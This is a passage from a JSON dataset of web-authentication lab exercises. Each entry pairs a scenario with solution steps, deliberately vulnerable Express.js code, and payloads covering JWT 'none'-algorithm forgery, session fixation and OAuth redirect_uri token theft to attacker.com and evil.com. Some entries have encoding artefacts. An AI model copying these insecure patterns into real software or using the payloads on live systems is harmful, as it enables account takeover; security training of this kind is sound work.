      "4. Change the payload of the token to impersonate Carlos (e.g., \"sub\":\"carlos\") and re-sign it using the same shared secret (if known or hardcoded).",
      "5. Send the forged token to App B to access Carlos's account.",
      "6. Success is confirmed when App B responds with Carlos's account details."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'shared-oauth-secret'; const users = { carlos: {}, alice: {} }; app.get('/auth', (req, res) => { const user = req.query.user || 'alice'; const token = jwt.sign({ sub: user, exp: Math.floor(Date.now() / 1000) + 3600 }, secret); res.send({ access_token: token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Missing token'); try { const decoded = jwt.verify(token, secret); res.send(`Account details for ${decoded.sub}`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002, () => console.log('OAuth Token Misuse Lab running on port 4002'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MiLCJleHAiOjE3MDAwMDAwMDB9.[signature]",
      "Authorization: Bearer [reused_token_from_AppA]",
      "jwt.sign({sub:'carlos'}, 'shared-oauth-secret')"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application initializes a session ID before user authentication and fails to regenerate it after login. The session ID remains fixed, allowing an attacker to hijack authenticated sessions. The application trusts any valid session ID. To solve: Hijack Carlos's authenticated session by forcing him to reuse your crafted session ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite Proxy to intercept a GET request to the login page. Notice the Set-Cookie: session=XYZ header.",
      "2. Note the session ID and forward the request to generate a fixed session before login.",
      "3. Use a crafted phishing email (or simulated social engineering) to convince Carlos to log in using your provided session ID (simulate this via cookie manipulation).",
      "4. Once Carlos logs in via that session, reuse the same session ID to access the authenticated /my-account page.",
      "5. Confirm access to Carlos's session by viewing the protected content on his account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'securepass' }]; app.get('/login', (req, res) => { if (!req.cookies.session) res.cookie('session', Math.random().toString(36).substring(2)); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) res.send('Logged in'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.session) res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: session=attacker123",
      "https://vulnerable-site.com/login; Cookie: session=attacker123",
      "Cookie injection via phishing link with crafted session"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass using 'none' algorithm",
    "Lab Description": "This application uses JWT for session management but fails to validate the signature algorithm securely. If the 'alg' field in the JWT header is set to 'none', the server skips signature verification. To solve: Forge a JWT with 'alg':'none' and escalate privileges to access Carlos's account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in to your account and inspect the session cookie. Decode the JWT using jwt.io or Burp Decoder.",
      "2. Note the header and payload. The current 'alg' is likely 'HS256'.",
      "3. Modify the JWT header to use 'alg':'none' and change the payload to impersonate carlos.",
      "4. Remove the signature part completely (only use header.payload).",
      "5. Replay the forged JWT as a session cookie and access /my-account to verify Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const SECRET = 'secret'; app.get('/login', (req, res) => { const token = jwt.sign({ username: 'wiener' }, SECRET); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const user = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (user.username === 'carlos') res.send('Carlos's account info'); else res.send('User account'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }, No signature",
      "JWT with only header.payload format"
    ]
  },
  {
    "Lab scenario": "OAuth token leak in redirect_uri via fragment mismanagement",
    "Lab Description": "The app uses OAuth2 with implicit flow for third-party login. It misuses the redirect_uri allowing an attacker to inject a malicious domain. The access token is returned in the fragment portion of the URI and can be exfiltrated. To solve: Extract Carlos's token by crafting a redirect_uri to a domain under your control.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to intercept the OAuth flow and inspect the redirect_uri parameter.",
      "2. Craft a redirect_uri pointing to attacker.com/#. The application appends the access_token after the hash.",
      "3. Simulate sending Carlos a link to login via OAuth using the crafted redirect_uri.",
      "4. Capture the access_token from the request at attacker.com using a local server.",
      "5. Replay the access token in a GET request to /my-account with Authorization: Bearer <token> header to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const token = 'access-token-carlos'; res.redirect(`${redirect}#access_token=${token}&token_type=bearer`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-carlos') res.send('Carlos private data'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Leak Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://oauth-provider.com/auth?redirect_uri=https://attacker.com/",
      "access_token=access-token-carlos",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in login authentication",
    "Lab Description": "The application uses JWT for authentication and is vulnerable due to insecure algorithm handling. It accepts tokens signed with 'none' algorithm if the header is tampered. The application does not verify the integrity of the JWT properly, allowing attackers to forge tokens. To solve: forge a valid token to impersonate the user 'admin' and access their dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a POST /login request and retrieve your JWT token from the Set-Cookie header.",
      "Decode the JWT using jwt.io or Postman. Observe that the header specifies 'HS256'.",
      "Modify the header to use 'none' as the algorithm and change the payload sub value to 'admin'.",
      "Remove the signature section entirely and re-encode the JWT.",
      "Replace the JWT in your cookie with the tampered token and access /admin-dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = { 'admin': 'adminpass', 'user': 'userpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Logged in'); } else { res.status(403).send('Invalid login'); } }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.sub === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in third-party redirect",
    "Lab Description": "The application uses OAuth for login via a third-party provider, but after authentication, it leaks the access token through the Referer header when redirecting to a third-party domain. This token can be captured by any attacker-controlled site in the redirect chain. To solve: capture Carlos's access token and use it to access their profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the OAuth redirect flow and inspect the Referer headers.",
      "Log in with your own account and observe that the final redirect URL leaks the access_token in the Referer header.",
      "Create an exploit HTML page that initiates the OAuth flow and uses a malicious redirect_uri controlled by you.",
      "Send a crafted OAuth link to Carlos via the built-in message feature to click.",
      "Capture the access token in your server logs and replay it to the /user/profile endpoint to impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/oauth/callback', (req, res) => { const { access_token } = req.query; res.redirect(`http://external-analytics.com/?token=${access_token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Leakage Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://auth.example.com/oauth/authorize?client_id=123&redirect_uri=http://attacker.com&response_type=token",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login redirect",
    "Lab Description": "This application initializes a session before login and uses the same session ID post-login. If an attacker can set a session ID for a victim before they log in, the attacker can hijack the session. To solve: force Carlos to use a session ID you control, then log in as Carlos and access his profile with your fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to initiate a GET /login request and observe the session ID being returned via Set-Cookie.",
      "Craft a link with a fixed session ID using GET /login?session=fixed123 and send this to Carlos through the feedback form.",
      "Once Carlos logs in via that link, he will be assigned session=fixed123.",
      "Use Burp Repeater to replay requests with session=fixed123 and access the /profile endpoint.",
      "Verify you are logged in as Carlos by confirming his email and profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'supersecure' }; app.get('/login', (req, res) => { const sessId = req.query.session || Math.random().toString(36).slice(2); sessions[sessId] = null; res.cookie('session', sessId); res.send('<form method=\"POST\">Username:<input name=\"username\">Password:<input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const sessId = req.cookies.session; const { username, password } = req.body; if (users[username] === password) { sessions[sessId] = username; res.redirect('/profile'); } else { res.send('Login failed'); } }); app.get('/profile', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Welcome ${user}`); } else { res.status(403).send('Not logged in'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /login?session=fixed123",
      "Cookie: session=fixed123",
      "POST /login with username=carlos&password=supersecure"
    ]
  },
  {
    "Lab scenario": "JWT signature none algorithm tampering in session authentication",
    "Lab Description": "The application uses JWT tokens to manage session state, but fails to validate the token signature algorithm properly. The backend accepts 'none' as a valid algorithm, bypassing token integrity verification. To solve: Forge a valid JWT token for the user 'carlos' and access his account page without needing credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture your JWT after logging in with your own credentials.",
      "2. Decode the JWT using jwt.io or a local tool and observe that the algorithm is set to HS256.",
      "3. Modify the header to use 'alg':'none' and remove the signature part entirely.",
      "4. Change the payload to {\"username\":\"carlos\"} and re-encode the JWT without signing it.",
      "5. Replace your session cookie with the forged token and reload the /account page.",
      "6. Verify access to Carlos's account page, which confirms successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'pass123' }]; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in'); }); app.get('/account', (req, res) => { const token = req.cookies.session; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload && payload.payload.username === 'carlos') res.send('Welcome Carlos!'); else res.send('Access denied'); }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "base64({\"alg\":\"none\"}).base64({\"username\":\"carlos\"})."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with implicit grant leaking tokens via redirect",
    "Lab Description": "The application uses OAuth with the implicit flow and incorrectly allows redirect URIs to be manipulated, causing access tokens to be leaked to third-party domains. To solve: Capture Carlos\u00e2\u20ac\u2122s access token and use it to access his protected profile page via the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth authorization URL when logging in and notice the use of response_type=token.",
      "2. Modify the redirect_uri parameter to point to an attacker-controlled site (e.g., https://attacker.com/callback).",
      "3. Wait for Carlos to log in and capture the fragment containing the access_token from your server logs.",
      "4. Replay the token in a Bearer authorization header using Postman or Burp Repeater.",
      "5. Send a GET request to /api/profile with the Authorization: Bearer <token> header.",
      "6. Confirm access to Carlos\u00e2\u20ac\u2122s profile data to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); } else { res.send('Unsupported flow'); } }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (auth && auth.includes('token-for-carlos')) res.send('Profile data of Carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnsite.com/auth?response_type=token&client_id=xyz&redirect_uri=https://evil.com",
      "GET /api/profile HTTP/1.1\\nAuthorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated session token reuse",
    "Lab Description": "The login endpoint fails to issue a new session identifier upon successful authentication, allowing an attacker to pre-define a session ID and force it onto a victim. To solve: Fixate Carlos's session ID, get him to log in using it, and hijack the session by accessing his My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to generate a new session ID by visiting the login page anonymously and capturing the Set-Cookie header.",
      "2. Craft a phishing link to login with that specific session ID in the Cookie header and trick Carlos into using it.",
      "3. After Carlos logs in using the fixated session, use the same session ID to access the /my-account endpoint.",
      "4. Confirm successful access by observing Carlos\u00e2\u20ac\u2122s account data.",
      "5. Capture a screenshot or extract specific identifiers to verify session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { carlos: 'secret123' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] === password) { const sid = req.cookies.sessionid; sessions[sid] = username; res.send('Logged in'); } else res.send('Login failed'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; const user = sessions[sid]; if (user === 'carlos') res.send('Carlos Account Details'); else res.status(403).send('Forbidden'); }); app.listen(3000);",
    "payloads": [
      "Cookie: sessionid=attackerFixedSID",
      "GET /login?username=carlos&password=secret123 HTTP/1.1\\nCookie: sessionid=attackerFixedSID",
      "GET /my-account HTTP/1.1\\nCookie: sessionid=attackerFixedSID"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allows session fixation attack in login flow",
    "Lab Description": "The application implements OAuth 2.0 for third-party authentication, but fails to regenerate the session ID after login. An attacker can fixate a session ID and force the victim to authenticate with it. The application reuses the original session after OAuth login. To solve: Hijack Carlos\u00e2\u20ac\u2122s session by initiating login via a pre-fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept /login with Burp Suite and note session cookie before redirect to OAuth provider.",
      "Confirm session ID is retained post OAuth callback via /oauth/callback endpoint.",
      "Craft phishing link that initiates login with fixed session and send it to victim.",
      "Wait for Carlos to authenticate via OAuth; then reuse the same session ID in your browser.",
      "Access /my-account as Carlos with hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { req.session.oauthStart = true; res.redirect('https://oauth-provider.com/auth'); }); app.get('/oauth/callback', (req, res) => { if (req.session.oauthStart) { req.session.user = 'carlos'; res.redirect('/my-account'); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send('Account details for ' + req.session.user); else res.status(401).send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "GET /login with pre-issued session cookie",
      "Reuse same session cookie after Carlos OAuth login",
      "Access /my-account with hijacked session"
    ]
  },
  {
    "Lab scenario": "JWT token tampering with 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JWTs to control access to user accounts. It does not validate the algorithm field when decoding JWTs. Exploiting this, attackers can replace the token algorithm with 'none' and forge admin tokens. To solve: Modify the token to impersonate Carlos and access /my-account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture Authorization: Bearer <token> using OWASP ZAP or Burp Suite.",
      "Decode JWT using jwt.io and inspect the 'alg' header value.",
      "Replace 'alg' with 'none' and set 'sub': 'carlos'.",
      "Remove the signature and re-encode the JWT.",
      "Send modified JWT in Authorization header to /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('Forbidden'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); const payload = jwt.verify(token, secret, { algorithms: [decoded.header.alg] }); res.send('Welcome ' + payload.sub); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"sub\":\"carlos\"}",
      "JWT without signature: base64url(header) + '.' + base64url(payload)"
    ]
  },
  {
    "Lab scenario": "Verbose logging leaks API key allowing unauthorized REST API access",
    "Lab Description": "The REST API backend logs full request headers including Authorization. The verbose debug output is exposed publicly via /logs endpoint. The attacker can extract Carlos\u00e2\u20ac\u2122s API key from logs and reuse it for privilege escalation. To solve: Extract and reuse Carlos\u00e2\u20ac\u2122s key to access restricted resource.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Browse /logs endpoint and look for recent API request logs.",
      "Identify a log entry containing Authorization header with Bearer token for Carlos.",
      "Copy the leaked token and set it in your API client (Postman).",
      "Send GET /api/private-data with Authorization: Bearer <leaked_token>.",
      "Access Carlos\u00e2\u20ac\u2122s restricted data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const logs = []; app.use((req, res, next) => { logs.push({ path: req.path, headers: req.headers }); next(); }); app.get('/api/private-data', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-token-123') res.send('Sensitive data for Carlos'); else res.status(403).send('Unauthorized'); }); app.get('/logs', (req, res) => { res.json(logs); }); app.listen(4000);",
    "payloads": [
      "GET /logs -> extract Bearer carlos-token-123",
      "GET /api/private-data with header Authorization: Bearer carlos-token-123"
    ]
  },
  {
    "Lab scenario": "REST-based Session Fixation in Login Flow",
    "Lab Description": "This lab's REST API implements insecure session handling that enables session fixation. The application generates a session ID before login, which is then reused post-authentication. To solve: Hijack a valid user session after fixing the session identifier in the victim's browser.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /session request to capture a pre-authentication session ID.",
      "Send a crafted login link to the victim with the fixed session ID as a cookie via social engineering.",
      "Wait for the victim to authenticate using the fixed session.",
      "Send a request to /my-account using the fixed session cookie to validate session takeover.",
      "Access Carlos's account details to confirm successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/session', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session_id', sid); res.send({ message: 'Session initialized' }); }); app.post('/login', (req, res) => { const sid = req.cookies.session_id; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (sid && user) { sessions[sid] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session_id]; if (session && session.authenticated) { res.send('Welcome, ' + session.user); } else { res.status(403).send('Not authorized'); } }); app.listen(4000);",
    "payloads": [
      "Cookie: session_id=FIXED123 before login; use same after login",
      "Social engineering link with fixed session cookie",
      "POST /login with fixed session in header"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass via None Algorithm",
    "Lab Description": "This lab uses JWTs for API authentication but improperly supports the `none` algorithm. This allows an attacker to forge a valid token without signing it. To solve: Generate a forged JWT for the admin user and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept an authenticated request and capture a valid JWT.",
      "Decode the JWT using jwt.io and observe the HS256 algorithm in the header.",
      "Modify the header to use \"alg\":\"none\" and payload to {\"username\":\"admin\"}.",
      "Remove the JWT signature and re-encode the token.",
      "Send the forged token in the Authorization header and access /admin-panel to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.send({ token }); }); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); try { const decoded = jwt.verify(token, secret); if (decoded.username === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Forbidden'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "{\"alg\":\"none\",\"typ\":\"JWT\"}",
      "{\"username\":\"admin\"}",
      "Base64Url(header).Base64Url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth Redirection Misconfiguration in Authorization Server",
    "Lab Description": "This lab demonstrates an insecure OAuth implementation where the redirect URI is not properly validated. The attacker can intercept the authorization code and exchange it for a token. To solve: Hijack Carlos\u00e2\u20ac\u2122s OAuth token by injecting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the login flow and observe the /authorize redirect request.",
      "Modify the redirect_uri parameter to a domain you control (e.g., attacker.com).",
      "Host a server to capture the authorization code sent to the malicious redirect URI.",
      "Exchange the stolen code with the /token endpoint using Postman to receive an access token.",
      "Use the token in Authorization header to access /my-account and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { redirect_uri, state } = req.query; const code = 'abc123'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'abc123') res.send({ access_token: 'admin-token' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer admin-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "https://attacker.com/callback as redirect_uri",
      "POST /token with stolen code",
      "Authorization: Bearer admin-token"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Token Verification",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management but improperly handles the 'alg' field in the token header. Instead of verifying the signature with a secret key, it trusts tokens with 'none' as the algorithm and accepts them without verification. The application grants access if a valid token for 'carlos' is submitted. To solve: Forge a token with alg set to 'none' and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept a request to /my-account using Burp Suite and extract the JWT from the Authorization header.",
      "2. Decode the JWT using jwt.io or Burp Decoder and note the payload structure.",
      "3. Modify the payload to {\"username\": \"carlos\"} and change the header to {\"alg\": \"none\"}.",
      "4. Remove the signature part entirely and re-encode the token as base64(header).base64(payload).",
      "5. Replay the request with the forged token using Burp Repeater and verify access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const user = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()).username; return res.send('Access granted to ' + user); } try { const verified = jwt.verify(token, secret); res.send('Access granted to ' + verified.username); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session Fixation in Login Endpoint",
    "Lab Description": "This application generates a session cookie before login and doesn't renew it post-authentication. This allows an attacker to pre-set a valid session cookie and trick a victim into authenticating using that session. The attacker can then hijack the session to gain access. To solve: Fixate Carlos's session ID, make him log in, then use the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Generate a session cookie by accessing the login page and intercepting the response with OWASP ZAP.",
      "2. Craft a phishing link with the pre-set session ID (e.g., /login?sessionid=abc123).",
      "3. Simulate Carlos logging in using the fixed session via Burp Repeater (change session ID in cookie manually).",
      "4. Replay the fixed session cookie to /my-account endpoint.",
      "5. Confirm hijacked session access to Carlos\u00e2\u20ac\u2122s account by observing personalized data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'qwerty123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sessionId] = null; res.cookie('sid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) return res.send('Welcome back ' + user); res.status(403).send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "sid=abc123 (preset in phishing link)",
      "POST /login with valid credentials while using attacker-supplied sid",
      "GET /my-account with sid=abc123"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Validation",
    "Lab Description": "The application uses OAuth 2.0 for authentication, but its redirect_uri parameter validation is flawed. It accepts subdomain-based open redirect patterns, allowing attackers to steal authorization codes. To solve: Construct a malicious redirect_uri that leads to a domain you control, extract Carlos's authorization code, and complete the OAuth login flow.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the OAuth login flow with Burp Suite and intercept the authorization request.",
      "2. Modify the redirect_uri to a domain under your control, such as https://attacker.carlos.lab/oauth-capture.",
      "3. Trick Carlos into clicking the malicious OAuth link (simulate in Repeater).",
      "4. Capture the authorization code redirected to your controlled domain from the browser network tab or Burp.",
      "5. Exchange the stolen code with the real client_id and redirect_uri to obtain an access token and log in as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); const authorizedRedirects = ['https://*.trusted.com/callback']; app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query;  if (authorizedRedirects.some(uri => redirect_uri.includes(uri.replace('*.', '')))) { const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid redirect_uri'); } }); app.post('/token', (req, res) => { const { code, client_id, redirect_uri } = req.body; if (code === 'authcode123') { res.json({ access_token: 'carlos_token_abc' }); } else { res.status(403).send('Invalid code'); } }); app.listen(4000);",
    "payloads": [
      "https://attacker.carlos.lab/oauth-capture?code=authcode123",
      "POST /token with { code: authcode123, redirect_uri: https://attacker.carlos.lab/oauth-capture, client_id: legit-app }"
    ]
  },
  {
    "Lab scenario": "JWT signature bypass via algorithm confusion in login API",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but fails to enforce secure verification of token signatures. The login endpoint signs JWTs with HMAC using a shared secret, but the backend accepts 'none' as the algorithm, bypassing signature validation entirely. To solve: Forge a valid JWT that grants access to Carlos\u00e2\u20ac\u2122s account without needing valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a login request and extract a valid JWT issued after logging into your own account.",
      "Decode the JWT using jwt.io or Burp Decoder to inspect the header and payload structure.",
      "Modify the token\u00e2\u20ac\u2122s header to change the algorithm from 'HS256' to 'none' and change the payload\u00e2\u20ac\u2122s sub claim to 'carlos'.",
      "Remove the signature part entirely, leaving just the header and payload base64url encoded and joined by a dot.",
      "Replay the modified JWT in the Authorization header of a /my-account request using Postman or Burp Repeater to gain access."
    ],
    "Vulnerability name": "Authentication",
